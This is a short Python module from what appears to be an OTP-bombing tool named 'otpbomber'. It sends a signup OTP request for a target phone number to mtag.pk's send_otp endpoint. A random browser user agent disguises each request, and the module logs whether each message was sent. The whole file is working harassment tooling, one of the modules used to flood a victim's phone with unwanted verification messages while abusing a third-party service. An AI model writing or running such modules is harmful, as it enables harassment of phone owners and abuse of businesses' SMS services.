from otpbomber.core import *
from otpbomber.localuseragent import *

async def mtag_voice(phone, client, out):
    name = 'mtag_voice'
    domain = 'mtag.pk'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {'msisdn': f'0{phone[-10:]}', 'action': 'signup'}
    try:
        response = await client.post('https://mtag.pk/api/send_otp', headers=headers, data=payload)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})